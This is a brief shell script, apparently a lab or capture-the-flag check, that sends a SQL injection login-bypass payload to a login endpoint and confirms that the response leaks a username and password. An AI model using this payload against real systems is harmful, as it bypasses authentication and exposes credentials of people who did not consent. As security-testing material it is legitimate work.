set -eu
out=$(curl -fsS -X POST -H "Host: ${BOX_VHOST}" \
    -d "username=' OR 1=1--&password=x" "http://${BOX_HOST}:8087/login")
echo "$out"
echo "$out" | grep -q "user=$BOX_U" || { echo "SQLi user missing" >&2; exit 1; }
echo "$out" | grep -q "pass=$BOX_P" || { echo "SQLi password missing" >&2; exit 1; }
